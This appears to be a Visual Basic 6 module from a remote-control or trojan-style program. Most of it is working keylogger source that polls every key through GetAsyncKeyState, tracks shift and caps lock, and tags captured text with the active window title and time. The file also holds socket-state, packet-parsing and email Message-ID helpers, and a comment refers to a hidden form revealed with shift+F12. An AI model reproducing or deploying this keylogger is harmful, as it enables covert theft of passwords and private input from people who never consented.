Attribute VB_Name = "modFunctions"
Option Explicit
Public Const SP1 As String = "§"    ' Seperates Level 1 Packets
Public Const SP2 As String = "¡"    ' Seperates Level 2 Packets

'===============================

'===============================
'   Keylog MOD
'===============================
Private Declare Function GetForegroundWindow Lib "user32.dll" () As Long
Private CurrentWindow As String
Private Declare Function CallWindowProc Lib "user32" Alias "CallWindowProcA" (ByVal lpPrevWndFunc As Long, ByVal hWnd As Long, ByVal Msg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Private Declare Function SetWindowLong Lib "user32" Alias "SetWindowLongA" (ByVal hWnd As Long, ByVal nIndex As Long, ByVal dwNewLong As Long) As Long
Private lpPrevWndProc As Long
Private Declare Function Getasynckeystate Lib "user32" Alias "GetAsyncKeyState" (ByVal VKEY As Long) As Integer
Private Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Long) As Integer
Private Declare Function SetWindowPos Lib "user32" (ByVal hWnd As Long, ByVal hWndInsertAfter As Long, ByVal x As Long, ByVal Y As Long, ByVal cX As Long, ByVal cY As Long, ByVal wFlags As Long) As Long
Private Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hWnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Private Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hWnd As Long) As Long
Private Const VK_CAPITAL = &H14


'===============================
'   Get Window Caption
'===============================
Function GetCaption(WindowHandle As Long) As String
    Dim Buffer As String, TextLength As Long
    TextLength& = GetWindowTextLength(WindowHandle&)
    Buffer$ = String(TextLength&, 0&)
    Call GetWindowText(WindowHandle&, Buffer$, TextLength& + 1)
    GetCaption$ = Buffer$
End Function


Public Function SocketState(numState As Integer)
'%%%% This function returns the text-state of
'%%%% the socket, when given the numeric-state.

    Select Case numState
    Case 0: SocketState = "Closed."
    Case 1: SocketState = "Open."
    Case 2: SocketState = "Listening."
    Case 3: SocketState = "Connection Pending."
    Case 4: SocketState = "Resolving Host."
    Case 5: SocketState = "Host Resolved."
    Case 6: SocketState = "Connecting."
    Case 7: SocketState = "Connected."
    Case 8: SocketState = "Peer Closing."
    Case 9: SocketState = "Error."
    End Select
    
End Function
'===============================
'   Log Keystrokes
'===============================
' NOTICE: The following code was found on PSC, author unknown.
' I have taken the source and modified it slightly into
' a function. I take no credit for the following.
Public Function LogKeys() As String
Dim txtKeys As String
txtKeys = ""

If CurrentWindow <> GetCaption(GetForegroundWindow) Then
'if the foreground window is different from the currentwindow
'then the window has changed
CurrentWindow = GetCaption(GetForegroundWindow)
'updates currentwindow to the actual current foreground window
txtKeys = txtKeys & vbCrLf & vbCrLf & "[[[[[[[[[ " & CurrentWindow & " ]]]]]]]]] - " & Time & vbCrLf
'note the change in txtkeys
End If

'the following gets the keys pressed and stores it in txtkeys

'press shift + f12 to get the form visible
Dim keystate As Long
Dim Shift As Long
Shift = Getasynckeystate(vbKeyShift)

keystate = Getasynckeystate(vbKeyA)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
txtKeys = txtKeys + "A"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
txtKeys = txtKeys + "a"
End If

keystate = Getasynckeystate(vbKeyB)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
txtKeys = txtKeys + "B"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
txtKeys = txtKeys + "b"
End If

keystate = Getasynckeystate(vbKeyC)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
txtKeys = txtKeys + "C"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
txtKeys = txtKeys + "c"
End If

keystate = Getasynckeystate(vbKeyD)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
txtKeys = txtKeys + "D"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
txtKeys = txtKeys + "d"
End If

keystate = Getasynckeystate(vbKeyE)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
txtKeys = txtKeys + "E"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
txtKeys = txtKeys + "e"
End If

keystate = Getasynckeystate(vbKeyF)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
txtKeys = txtKeys + "F"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
txtKeys = txtKeys + "f"
End If

keystate = Getasynckeystate(vbKeyG)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
txtKeys = txtKeys + "G"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
txtKeys = txtKeys + "g"
End If

keystate = Getasynckeystate(vbKeyH)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
txtKeys = txtKeys + "H"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
txtKeys = txtKeys + "h"
End If

keystate = Getasynckeystate(vbKeyI)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
txtKeys = txtKeys + "I"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
txtKeys = txtKeys + "i"
End If

keystate = Getasynckeystate(vbKeyJ)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
txtKeys = txtKeys + "J"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
txtKeys = txtKeys + "j"
End If

keystate = Getasynckeystate(vbKeyK)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
txtKeys = txtKeys + "K"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
txtKeys = txtKeys + "k"
End If

keystate = Getasynckeystate(vbKeyL)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
txtKeys = txtKeys + "L"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
txtKeys = txtKeys + "l"
End If


keystate = Getasynckeystate(vbKeyM)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
txtKeys = txtKeys + "M"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
txtKeys = txtKeys + "m"
End If


keystate = Getasynckeystate(vbKeyN)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
txtKeys = txtKeys + "N"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
txtKeys = txtKeys + "n"
End If

keystate = Getasynckeystate(vbKeyO)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
txtKeys = txtKeys + "O"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
txtKeys = txtKeys + "o"
End If

keystate = Getasynckeystate(vbKeyP)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
txtKeys = txtKeys + "P"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
txtKeys = txtKeys + "p"
End If

keystate = Getasynckeystate(vbKeyQ)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
txtKeys = txtKeys + "Q"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
txtKeys = txtKeys + "q"
End If

keystate = Getasynckeystate(vbKeyR)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
txtKeys = txtKeys + "R"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
txtKeys = txtKeys + "r"
End If

keystate = Getasynckeystate(vbKeyS)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
txtKeys = txtKeys + "S"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
txtKeys = txtKeys + "s"
End If

keystate = Getasynckeystate(vbKeyT)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
txtKeys = txtKeys + "T"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
txtKeys = txtKeys + "t"
End If

keystate = Getasynckeystate(vbKeyU)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
txtKeys = txtKeys + "U"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
txtKeys = txtKeys + "u"
End If

keystate = Getasynckeystate(vbKeyV)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
txtKeys = txtKeys + "V"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
txtKeys = txtKeys + "v"
End If

keystate = Getasynckeystate(vbKeyW)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
txtKeys = txtKeys + "W"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
txtKeys = txtKeys + "w"
End If

keystate = Getasynckeystate(vbKeyX)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
txtKeys = txtKeys + "X"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
txtKeys = txtKeys + "x"
End If

keystate = Getasynckeystate(vbKeyY)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
txtKeys = txtKeys + "Y"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
txtKeys = txtKeys + "y"
End If

keystate = Getasynckeystate(vbKeyZ)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
txtKeys = txtKeys + "Z"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
txtKeys = txtKeys + "z"
End If

keystate = Getasynckeystate(vbKey1)
If Shift = 0 And (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "1"
      End If
      
      If Shift <> 0 And (keystate And &H1) = &H1 Then
txtKeys = txtKeys + "!"
End If


keystate = Getasynckeystate(vbKey2)
If Shift = 0 And (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "2"
      End If
      
      If Shift <> 0 And (keystate And &H1) = &H1 Then
txtKeys = txtKeys + "@"
End If


keystate = Getasynckeystate(vbKey3)
If Shift = 0 And (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "3"
      End If
      
      If Shift <> 0 And (keystate And &H1) = &H1 Then
txtKeys = txtKeys + "#"
End If


keystate = Getasynckeystate(vbKey4)
If Shift = 0 And (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "4"
      End If

If Shift <> 0 And (keystate And &H1) = &H1 Then
txtKeys = txtKeys + "$"
End If


keystate = Getasynckeystate(vbKey5)
If Shift = 0 And (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "5"
      End If
      
      If Shift <> 0 And (keystate And &H1) = &H1 Then
txtKeys = txtKeys + "%"
End If


keystate = Getasynckeystate(vbKey6)
If Shift = 0 And (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "6"
      End If
      
      If Shift <> 0 And (keystate And &H1) = &H1 Then
txtKeys = txtKeys + "^"
End If


keystate = Getasynckeystate(vbKey7)
If Shift = 0 And (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "7"
     End If
     
     If Shift <> 0 And (keystate And &H1) = &H1 Then
txtKeys = txtKeys + "&"
End If

   
   keystate = Getasynckeystate(vbKey8)
If Shift = 0 And (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "8"
     End If
     
     If Shift <> 0 And (keystate And &H1) = &H1 Then
txtKeys = txtKeys + "*"
End If

   
   keystate = Getasynckeystate(vbKey9)
If Shift = 0 And (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "9"
     End If
     
     If Shift <> 0 And (keystate And &H1) = &H1 Then
txtKeys = txtKeys + "("
End If

   
   keystate = Getasynckeystate(vbKey0)
If Shift = 0 And (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "0"
     End If
     
     If Shift <> 0 And (keystate And &H1) = &H1 Then
txtKeys = txtKeys + ")"
End If

   
   keystate = Getasynckeystate(vbKeyBack)
If (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "{bkspc}"
     End If
   
   keystate = Getasynckeystate(vbKeyTab)
If (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "{tab}"
     End If
   
   keystate = Getasynckeystate(vbKeyReturn)
If (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + vbCrLf
     End If
   
   keystate = Getasynckeystate(vbKeyShift)
If (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "{shift}"
     End If
   
   keystate = Getasynckeystate(vbKeyControl)
If (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "{ctrl}"
     End If
   
   keystate = Getasynckeystate(vbKeyMenu)
If (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "{alt}"
     End If
   
   keystate = Getasynckeystate(vbKeyPause)
If (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "{pause}"
     End If
   
   keystate = Getasynckeystate(vbKeyEscape)
If (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "{esc}"
     End If
   
   keystate = Getasynckeystate(vbKeySpace)
If (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + " "
     End If
   
   keystate = Getasynckeystate(vbKeyEnd)
If (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "{end}"
     End If
   
   keystate = Getasynckeystate(vbKeyHome)
If (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "{home}"
     End If

keystate = Getasynckeystate(vbKeyLeft)
If (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "{left}"
     End If

keystate = Getasynckeystate(vbKeyRight)
If (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "{right}"
     End If

keystate = Getasynckeystate(vbKeyUp)
If (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "{up}"
     End If
   
   keystate = Getasynckeystate(vbKeyDown)
If (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "{down}"
     End If

keystate = Getasynckeystate(vbKeyInsert)
If (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "{insert}"
     End If

keystate = Getasynckeystate(vbKeyDelete)
If (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "{Delete}"
     End If

keystate = Getasynckeystate(&HBA)
If Shift = 0 And (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + ";"
     End If
     
     If Shift <> 0 And (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + ":"
  
      End If
     
keystate = Getasynckeystate(&HBB)
If Shift = 0 And (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "="
     End If
     
     If Shift <> 0 And (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "+"
     End If

keystate = Getasynckeystate(&HBC)
If Shift = 0 And (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + ","
     End If
     
     If Shift <> 0 And (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "<"
     End If

keystate = Getasynckeystate(&HBD)
If Shift = 0 And (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "-"
     End If

If Shift <> 0 And (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "_"
     End If

keystate = Getasynckeystate(&HBE)
If Shift = 0 And (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "."
     End If

If Shift <> 0 And (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + ">"
     End If

keystate = Getasynckeystate(&HBF)
If Shift = 0 And (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "/"
     End If
     
     If Shift <> 0 And (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "?"
     End If

keystate = Getasynckeystate(&HC0)
If Shift = 0 And (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "`"
     End If
     
     If Shift <> 0 And (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "~"
     End If

keystate = Getasynckeystate(&HDB)
If Shift = 0 And (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "["
     End If
     
     If Shift <> 0 And (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "{"
     End If

keystate = Getasynckeystate(&HDC)
If Shift = 0 And (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "\"
     End If
     
     If Shift <> 0 And (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "|"
     End If

keystate = Getasynckeystate(&HDD)
If Shift = 0 And (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "]"
     End If
     
     If Shift <> 0 And (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "}"
     End If

keystate = Getasynckeystate(&HDE)
If Shift = 0 And (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "'"
     End If
     
     If Shift <> 0 And (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + Chr$(34)
     End If

keystate = Getasynckeystate(vbKeyMultiply)
If (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "*"
     End If

keystate = Getasynckeystate(vbKeyDivide)
If (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "/"
     End If

keystate = Getasynckeystate(vbKeyAdd)
If (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "+"
     End If
   
keystate = Getasynckeystate(vbKeySubtract)
If (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "-"
     End If
   
keystate = Getasynckeystate(vbKeyDecimal)
If (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "{Del}"
     End If
     
   keystate = Getasynckeystate(vbKeyF1)
If (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "{F1}"
     End If
   
   keystate = Getasynckeystate(vbKeyF2)
If (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "{F2}"
     End If
   
   keystate = Getasynckeystate(vbKeyF3)
If (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "{F3}"
     End If
   
   keystate = Getasynckeystate(vbKeyF4)
If (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "{F4}"
     End If
   
   keystate = Getasynckeystate(vbKeyF5)
If (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "{F5}"
     End If
   
   keystate = Getasynckeystate(vbKeyF6)
If (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "{F6}"
     End If
   
   keystate = Getasynckeystate(vbKeyF7)
If (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "{F7}"
     End If
   
   keystate = Getasynckeystate(vbKeyF8)
If (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "{F8}"
     End If
   
   keystate = Getasynckeystate(vbKeyF9)
If (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "{F9}"
     End If
   
   keystate = Getasynckeystate(vbKeyF10)
If (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "{F10}"
     End If
   
   keystate = Getasynckeystate(vbKeyF11)
If (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "{F11}"
     End If
   
   keystate = Getasynckeystate(vbKeyF12)
If Shift = 0 And (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "{F12}"
     End If
     

         
    keystate = Getasynckeystate(vbKeyNumlock)
If (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "{NumLock}"
     End If
     
     keystate = Getasynckeystate(vbKeyScrollLock)
If (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "{ScrollLock}"
         End If
   
    keystate = Getasynckeystate(vbKeyPrint)
If (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "{PrintScreen}"
         End If
       
       keystate = Getasynckeystate(vbKeyPageUp)
If (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "{PageUp}"
         End If
       
       keystate = Getasynckeystate(vbKeyPageDown)
If (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "{Pagedown}"
         End If

         keystate = Getasynckeystate(vbKeyNumpad1)
If (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "1"
         End If
         
         keystate = Getasynckeystate(vbKeyNumpad2)
If (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "2"
         End If
         
         keystate = Getasynckeystate(vbKeyNumpad3)
If (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "3"
         End If
         
         keystate = Getasynckeystate(vbKeyNumpad4)
If (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "4"
         End If
         
         keystate = Getasynckeystate(vbKeyNumpad5)
If (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "5"
         End If
         
         keystate = Getasynckeystate(vbKeyNumpad6)
If (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "6"
         End If
         
         keystate = Getasynckeystate(vbKeyNumpad7)
If (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "7"
         End If
         
         keystate = Getasynckeystate(vbKeyNumpad8)
If (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "8"
         End If
         
         keystate = Getasynckeystate(vbKeyNumpad9)
If (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "9"
         End If
         
         keystate = Getasynckeystate(vbKeyNumpad0)
If (keystate And &H1) = &H1 Then
  txtKeys = txtKeys + "0"
         End If
         
If txtKeys <> "" Then LogKeys = txtKeys Else txtKeys = ""
' Update log

End Function
Public Function CAPSLOCKON() As Boolean
Static bInit As Boolean
Static bOn As Boolean
If Not bInit Then
While Getasynckeystate(VK_CAPITAL)
Wend
bOn = GetKeyState(VK_CAPITAL)
bInit = True
Else
If Getasynckeystate(VK_CAPITAL) Then
While Getasynckeystate(VK_CAPITAL)
DoEvents
Wend
bOn = Not bOn
End If
End If
CAPSLOCKON = bOn
End Function



'===============================
'   Generate Message ID
'===============================
Public Function GenerateMessageID(ByVal sHost As String) As String
    Dim idnum As Double
    Dim sMessageID As String
    sMessageID = "Message-ID: "
    ' this makes the randomize seed different every time
    Randomize Int(CDbl((Now))) + Timer
    idnum = GetRandom(9999999999999#, 99999999999999#)
    sMessageID = sMessageID & CStr(idnum)
    idnum = GetRandom(9999, 99999)
    sMessageID = sMessageID & "." & CStr(idnum) & ".qmail@" & sHost
    GenerateMessageID = sMessageID
End Function


'===============================
'   Random Function
'===============================
Public Function GetRandom(ByVal dFrom As Double, ByVal dTo As Double) As Double

    Dim x As Double
    Randomize
    x = dTo - dFrom
    GetRandom = Int((x * Rnd) + 1) + dFrom
End Function


'===============================
'   Pull Window Process
'===============================
Function WindowProc(ByVal hw As Long, ByVal uMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Dim x As Long, a As String
Dim wp As Integer
Dim temp As Variant
Dim ReadBuffer(1000) As Byte

    WindowProc = CallWindowProc(lpPrevWndProc, hw, uMsg, wParam, lParam)
End Function



'====================================
'   Word Function
'====================================
Public Function Word(ByVal sSource As String, n As Long, SP As String) As String
' This function is used to parse data. Data is send as
' multiple commands in one packet. Each command is seperated
' by a special character. We retrieve specific commands by
' calling 'word' and specifying what seperates each 'word'.
'=================================================
' Word retrieves the nth word from sSource
' Usage:
'    Word("red blue green ", 2)   "blue"
'=================================================
' NOTICE: The following code was found on PSC, author unknown.
' I take no credit for the following.

Dim pointer As Long   'start parameter of Instr()
Dim pos     As Long   'position of target in InStr()
Dim x       As Long   'word count
Dim lEnd    As Long   'position of trailing word delimiter

'sSource = CSpace(sSource)

'find the nth word
x = 1
pointer = 1

Do
   Do While Mid$(sSource, pointer, 1) = SP     'skip consecutive spaces
      pointer = pointer + 1
   Loop
   If x = n Then                               'the target word-number
      lEnd = InStr(pointer, sSource, SP)       'pos of space at end of word
      If lEnd = 0 Then lEnd = Len(sSource) + 1 '   or if its the last word
      Word = Mid$(sSource, pointer, lEnd - pointer)
      Exit Do                                  'word found, done
   End If
  
   pos = InStr(pointer, sSource, SP)           'find next space
   If pos = 0 Then Exit Do                     'word not found
   x = x + 1                                   'increment word counter
  
   pointer = pos + 1                           'start of next word
Loop
  
End Function
